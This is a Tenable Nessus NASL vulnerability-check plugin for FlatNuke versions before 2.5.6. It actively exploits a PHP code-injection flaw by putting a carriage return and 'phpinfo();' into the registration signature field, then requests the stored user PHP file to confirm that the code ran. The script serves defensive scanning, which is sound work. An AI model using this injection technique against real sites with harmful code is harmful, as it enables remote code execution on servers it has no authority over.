#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(19396);
  script_version("$Revision: 1.14 $");

  script_cve_id("CVE-2005-2537", "CVE-2005-2538", "CVE-2005-2539", "CVE-2005-2540");
  script_bugtraq_id(14483, 14485);
  script_xref(name:"OSVDB", value:"18549");
  script_xref(name:"OSVDB", value:"18550");
  script_xref(name:"OSVDB", value:"18551");
  script_xref(name:"OSVDB", value:"18552");
  script_xref(name:"OSVDB", value:"18553");
  script_xref(name:"OSVDB", value:"18554");

  script_name(english:"FlatNuke < 2.5.6 Multiple Remote Vulnerabilities (XSS, Disc, Command Exe)");
  script_summary(english:"Checks for multiple vulnerabilities in FlatNuke < 2.5.6");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is running FlatNuke, a content management system
written in PHP and using flat files rather than a database for its
storage. 

The version of FlatNuke installed on the remote host suffers from
several flaws:

  - Arbitrary PHP Code Execution Vulnerability
    The application fails to remove newlines from a user's 
    registration information and stores it as a PHP file with 
    a known path. An attacker can leverage this flaw to 
    execute arbitrary PHP code on the remote host subject to
    the privileges of the web server userid.

  - Multiple Cross-Site Scripting Vulnerabilities
    Various scripts do not sanitize user-supplied input 
    through several parameters before using it in dynamically
    generated pages, which can be exploited by attackers to
    launch cross-site scripting attacks against the affected
    application." );
 script_set_attribute(attribute:"see_also", value:"http://retrogod.altervista.org/flatnuke.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to FlatNuke 2.5.6 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();

 
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Initialize some variables.
user = rand_str();
pass = rand_str();


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/flatnuke", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Try to call the forum registration script.
  w = http_send_recv3(method:"GET", item:string(dir, "/forum/index.php?op=vis_reg"), port:port);
  if (isnull(w)) exit(1, "The web server did not answer");
  res = w[2];

  # If it looks like FlatNuke's registration script.
  if (
    "<input type=hidden name=op value=reg>" >< res &&
    'Powered by <b><a href="http://flatnuke.sourceforge.net">FlatNuke' >< res
  ) {
    # Try to exploit the flaw to run phpinfo().
    postdata = raw_string(
      "op=reg&",
      "nome=", user, "&",
      "regpass=", pass, "&",
      "reregpass=", pass, "&",
      "firma=", 0x0d, "phpinfo();"
    );
    w = http_send_recv3(method:"POST", port: port,
      item: dir + "/forum/index.php",
      content_type: "application/x-www-form-urlencoded",
      data: postdata);
    if (isnull(w)) exit(1, "The web server did not answer");

    # Now try to retrieve the template.
    w = http_send_recv3(method:"GET",
      item:string(dir, "/forums/users/", user, ".php"), 
      port:port
    );
    if (isnull(w)) exit(1, "The web server did not answer");
    res = w[2];

    # There's a problem if it looks like the output of phpinfo().
    if ("PHP Version" >< res) {
      report = string(
        "\n",
        "Nessus has successfully exploited this vulnerability by registering",
        "the user '", user, "' in FlatNuke on the remote host. You are\n",
        "strongly encouraged to delete this user as soon as possible as\n",
        "it can be used to reveal information about how PHP is configured\n",
        "on the remote host.\n"
      );

      security_hole(port:port, extra:report);
      set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
      exit(0);
    }
  }
}
